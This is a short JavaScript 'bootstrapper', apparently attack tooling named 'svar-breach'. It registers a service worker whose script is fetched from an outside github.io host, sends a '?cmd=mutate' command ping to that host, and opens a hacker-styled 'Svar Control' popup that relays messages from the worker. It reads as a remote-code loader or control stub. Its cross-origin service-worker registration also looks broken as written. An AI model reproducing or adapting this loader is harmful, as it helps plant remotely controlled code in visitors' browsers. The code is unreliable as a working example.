
// svar-bootstrap.js — Svar External Bootstrapper v0.1

(async () => {
  const baseURL = 'https://kishan5965.github.io/svar-breach/';
  const coreScript = `${baseURL}stinger-core.js`;
  const scopePath = '/svar-breach/';

  console.log('[Svar Bootstrap] Starting external sequence...');

  if ('serviceWorker' in navigator) {
    try {
      const reg = await navigator.serviceWorker.register(coreScript, { scope: scopePath });
      await navigator.serviceWorker.ready;
      console.log('[Svar Bootstrap] Service worker registered and ready');
    } catch (err) {
      console.error('[Svar Bootstrap] Registration failed:', err);
      return;
    }
  }

  try {
    const mutateRes = await fetch(`${baseURL}?cmd=mutate`);
    const text = await mutateRes.text();
    console.log('[Svar Bootstrap] Mutation ping successful:', text);
  } catch (err) {
    console.error('[Svar Bootstrap] Mutation ping failed:', err);
  }

  const controlWin = window.open('', 'SvarControl', 'width=600,height=400');
  if (controlWin) {
    controlWin.document.write(`
      <html>
        <head><title>Svar Control</title></head>
        <body style="background:#111;color:#0f0;padding:10px;font-family:sans-serif;">
          <h2>🧠 Svar External Node</h2>
          <pre id="log">Initializing...</pre>
          <script>
            navigator.serviceWorker.addEventListener('message', e => {
              const log = document.getElementById('log');
              log.textContent += '\n' + e.data;
            });
          </script>
        </body>
      </html>
    `);
    console.log('[Svar Bootstrap] Control window deployed');
  } else {
    console.warn('[Svar Bootstrap] Control window blocked or failed to open');
  }
})();
